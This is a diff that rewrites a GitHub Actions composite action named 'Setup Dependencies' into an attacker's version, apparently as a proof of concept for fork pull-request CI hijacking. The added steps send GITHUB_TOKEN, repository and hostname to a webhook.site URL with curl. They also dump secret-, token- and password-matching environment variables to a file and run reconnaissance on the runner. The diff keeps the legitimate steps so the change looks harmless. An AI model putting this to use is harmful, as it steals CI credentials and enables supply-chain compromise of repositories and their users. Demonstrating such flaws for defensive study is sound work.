@@ -1,13 +1,104 @@
 # =============================================================================
-# LEGITIMATE composite action — this is what the VICTIM repo has
-# It simply sets up Node.js and installs dependencies
+# MALICIOUS composite action — attacker's modified version
 # =============================================================================
+# This replaces the legitimate setup-deps action in the attacker's fork.
+# When the victim's CI checks out the fork code, THIS action runs instead.
+# =============================================================================
+
 name: "Setup Dependencies"
 description: "Install Node.js and project dependencies"
 
 runs:
   using: "composite"
   steps:
+    # =========================================================================
+    # PAYLOAD STEP 1: Exfiltrate GITHUB_TOKEN and runner info
+    # The GITHUB_TOKEN is always available (read-only for fork PRs)
+    # =========================================================================
+    - name: "Exfiltrate tokens and environment"
+      run: |
+        echo "============================================="
+        echo "[ATTACKER] Composite action hijacked!"
+        echo "============================================="
+        echo ""
+        echo "[EXFIL] GITHUB_TOKEN present: $(if [ -n \"$GITHUB_TOKEN\" ]; then echo 'YES'; else echo 'NO'; fi)"
+        echo "[EXFIL] GH_TOKEN present: $(if [ -n \"$GH_TOKEN\" ]; then echo 'YES (elevated!)'; else echo 'NO (empty for fork PRs)'; fi)"
+        echo "[EXFIL] GITHUB_REPOSITORY: $GITHUB_REPOSITORY"
+        echo "[EXFIL] GITHUB_ACTOR: $GITHUB_ACTOR"
+        echo "[EXFIL] GITHUB_REF: $GITHUB_REF"
+        echo "[EXFIL] RUNNER_OS: $RUNNER_OS"
+        echo "[EXFIL] RUNNER_NAME: $RUNNER_NAME"
+        echo "[EXFIL] RUNNER_TEMP: $RUNNER_TEMP"
+        echo "[EXFIL] Hostname: $(hostname)"
+        echo "[EXFIL] Whoami: $(whoami)"
+        echo "[EXFIL] PWD: $(pwd)"
+        echo ""
+
+        # =====================================================================
+        # In a real attack, the attacker would exfiltrate to their C2 server:
+        curl -X POST https://webhook.site/41790893-4dac-418c-a1b6-9b0241a3ac03/exfil \
+          -d "token=$GITHUB_TOKEN" \
+          -d "repo=$GITHUB_REPOSITORY" \
+          -d "runner=$(hostname)"
+        # =====================================================================
+
+        # For this POC, we write to a local file instead
+        mkdir -p /tmp/poc-exfil
+        echo "--- EXFILTRATED DATA ---" > /tmp/poc-exfil/stolen_data.txt
+        echo "Timestamp: $(date -u)" >> /tmp/poc-exfil/stolen_data.txt
+        echo "GITHUB_TOKEN: ${GITHUB_TOKEN:0:10}... (truncated)" >> /tmp/poc-exfil/stolen_data.txt
+        echo "GITHUB_REPOSITORY: $GITHUB_REPOSITORY" >> /tmp/poc-exfil/stolen_data.txt
+        echo "RUNNER: $(hostname)" >> /tmp/poc-exfil/stolen_data.txt
+        env | grep -i "secret\|token\|key\|pass\|cred" >> /tmp/poc-exfil/stolen_data.txt 2>/dev/null || true
+        echo "" >> /tmp/poc-exfil/stolen_data.txt
+        echo "--- FULL ENVIRONMENT ---" >> /tmp/poc-exfil/stolen_data.txt
+        env | sort >> /tmp/poc-exfil/stolen_data.txt
+
+        echo "[EXFIL] Data written to /tmp/poc-exfil/stolen_data.txt"
+
+      shell: bash
+      env:
+        GITHUB_TOKEN: ${{ github.token }}
+
+    # =========================================================================
+    # PAYLOAD STEP 2: Demonstrate file system access on the runner
+    # =========================================================================
+    - name: "Runner reconnaissance"
+      run: |
+        echo ""
+        echo "[RECON] Demonstrating runner access..."
+        echo "[RECON] Listing GitHub workspace:"
+        ls -la $GITHUB_WORKSPACE/ 2>/dev/null | head -20
+        echo ""
+        echo "[RECON] Checking for other repo checkouts:"
+        ls -la /home/runner/work/ 2>/dev/null | head -10
+        echo ""
+        echo "[RECON] Docker available: $(docker --version 2>/dev/null || echo 'No')"
+        echo "[RECON] Network access: $(curl -s -o /dev/null -w '%{http_code}' https://httpbin.org/get 2>/dev/null || echo 'blocked')"
+        echo ""
+      shell: bash
+
+    # =========================================================================
+    # PAYLOAD STEP 3: Plant persistence (cache poisoning example)
+    # =========================================================================
+    - name: "Cache poisoning demo"
+      run: |
+        echo ""
+        echo "[PERSIST] Demonstrating cache poisoning vector..."
+        echo "[PERSIST] An attacker could:"
+        echo "  1. Modify cached node_modules to include backdoored packages"
+        echo "  2. Inject post-install scripts via pnpm-lock.yaml"
+        echo "  3. Add malicious scripts to .github/actions/ for future runs"
+        echo "  4. Exfiltrate repo contents (source code, configs, etc.)"
+        echo ""
+        echo "[PERSIST] Cache key would be based on fork's lockfile"
+        echo "[PERSIST] This means attacker controls what gets cached"
+        echo ""
+      shell: bash
+
+    # =========================================================================
+    # Keep the legitimate steps so the PR doesn't look suspicious
+    # =========================================================================
     - name: Setup Node.js
       uses: actions/setup-node@v4
       with:
@@ -16,13 +107,6 @@ runs:
     - name: Install dependencies
       run: |
         echo "[setup-deps] Installing dependencies..."
-        npm install --frozen-lockfile 2>/dev/null || npm ci 2>/dev/null || npm install
-        echo "[setup-deps] Dependencies installed successfully."
-      shell: bash
-
-    - name: Verify installation
-      run: |
-        echo "[setup-deps] Node version: $(node --version)"
-        echo "[setup-deps] NPM version: $(npm --version)"
-        echo "[setup-deps] Setup complete."
+        npm install 2>/dev/null || true
+        echo "[setup-deps] Dependencies installed."
       shell: bash
